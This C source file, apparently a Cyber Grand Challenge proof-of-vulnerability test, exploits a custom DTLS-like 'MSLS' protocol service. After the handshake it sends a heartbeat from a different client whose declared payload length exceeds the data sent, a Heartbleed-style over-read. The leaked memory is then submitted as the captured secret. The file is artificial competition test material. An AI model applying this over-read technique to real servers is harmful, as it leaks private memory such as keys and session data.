
/*

Author: Debbie Nuttall <debbie@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libpov.h>
#include <libcgc.h>

#define TO_CB   1
#define FROM_CB 0
#define TO_SF   3
#define FROM_SF 3

#pragma pack(push, 1)
typedef struct ClientHello_s {
  uint16_t length;
  uint16_t version;
  uint8_t type;
  uint32_t checksum;
  uint32_t connection_id;
  uint16_t msg_length;
  //
  uint16_t msg_type;
  uint32_t sequence_number;
  uint32_t client_id;
  uint16_t hs_msg_length;
  //
  uint16_t client_version;
  uint32_t random;
  uint32_t session_id;
  uint32_t cookie[128];
  uint16_t cipher_suites[12];
} MSLS_CLIENT_HELLO_MSG;


typedef struct HelloVerify_s {
  uint16_t length;
  uint16_t version;
  uint8_t type;
  uint32_t checksum;
  uint32_t connection_id;
  uint16_t msg_length;
  //
  uint16_t msg_type;
  uint32_t sequence_number;
  uint32_t client_id;
  uint16_t hs_msg_length;
  //
  uint16_t server_version;
  uint32_t cookie[128];
} MSLS_HELLO_VERIFY_MSG;

typedef struct Heartbeat_s {
  uint16_t length;
  uint16_t version;
  uint8_t type;
  uint32_t checksum;
  uint32_t connection_id;
  uint16_t msg_length;
  //
  uint8_t hb_type;
  uint16_t payload_length;
  uint8_t payload[128 + 256];
} MSLS_HEARTBEAT_MSG;

#pragma pack(pop)

int SendToCB(char *buf, int length) {
  int total_sent = 0;
  int ret;
  size_t bytes_sent = 0;
  while(total_sent < length) {
    ret = transmit(TO_CB, buf + total_sent, length - total_sent, &bytes_sent);
    if (ret != 0) {
      // error
      return -1;
    }
    if (bytes_sent == 0) {
      break;
    }
    total_sent += bytes_sent;
  }
  return bytes_sent;
}

int ReceiveFromCB(char *buf, int length) {
  size_t total_received = 0;
  size_t bytes_received = 0;
  int ret;
  while (total_received < length) {
    ret = receive(FROM_CB, buf + total_received , length - total_received , &bytes_received);
    if (ret != 0) {
      return -1;
    }
    if (bytes_received == 0) {
      break;
    }
    total_received += bytes_received;
  }
  return total_received;
}


int main(void) {
  // negotiate
  type2_vals t2vals;
  type2_negotiate(&t2vals);
  
  // Send Client Hello Message
  uint32_t client_id;
  random(&client_id, 4, NULL);
  MSLS_CLIENT_HELLO_MSG msg;
  msg.length = sizeof(MSLS_CLIENT_HELLO_MSG);
  msg.version = 0xff01;
  msg.type = 0x03;
  msg.connection_id = client_id;
  msg.hs_msg_length = 2*12 + 4*128 + 4 + 4 + 2;
  msg.msg_length = msg.hs_msg_length + 2 + 4 + 4 + 2;
  msg.msg_type = 0x51;
  msg.client_id = client_id;
  msg.client_version = 0xff01;
  msg.session_id = client_id;

  msg.checksum = 0;
  for (int i=0; i < msg.msg_length; i++)
  {
    msg.checksum = ((msg.checksum << 8) | (msg.checksum >> 24)) ^ ((uint8_t *)&msg.msg_type)[i];
  }

  SendToCB((char *)&msg, sizeof(MSLS_CLIENT_HELLO_MSG));
  // Receive Hello Verify
  MSLS_HELLO_VERIFY_MSG response;
  ReceiveFromCB((char *)&response, sizeof(MSLS_HELLO_VERIFY_MSG));
  memcpy(&msg.cookie, &response.cookie, 128*4); 

  char buffer[600];
  // Send Client Hello Again
  msg.checksum = 0;
  for (int i=0; i < msg.msg_length; i++)
  {
    msg.checksum = ((msg.checksum << 8) | (msg.checksum >> 24)) ^ ((uint8_t *)&msg.msg_type)[i];
  }
  SendToCB((char *)&msg, sizeof(MSLS_CLIENT_HELLO_MSG));
  ReceiveFromCB(buffer, 35); // Receive ServerHello
  ReceiveFromCB(buffer, 539); // Receive ServerKeyX
  ReceiveFromCB(buffer, 27);  // Receive ServerDone
  // Send Heartbeat from different client id
  MSLS_HEARTBEAT_MSG hb;
  hb.length = sizeof(hb) - 256;
  hb.version = 0xff01;
  hb.type = 0x05;
  random(&client_id, 4, NULL);
  hb.connection_id = client_id;
  hb.msg_length = 128 + 2 + 1;
  hb.hb_type = 0x41;
  hb.payload_length = 128 + 256;

  hb.checksum = 0;
  for (int i=0; i < hb.msg_length; i++)
  {
    hb.checksum = ((hb.checksum << 8) | (hb.checksum >> 24)) ^ ((uint8_t *)&hb.hb_type)[i];
  }
  SendToCB((char *)&hb, hb.length);
  ReceiveFromCB((char *)&hb, sizeof(hb) - (128+256));
  ReceiveFromCB((char *)&hb.payload, hb.payload_length);
  
  type2_submit((unsigned char *)&hb.payload + 138, 4);

  
  return 0;
}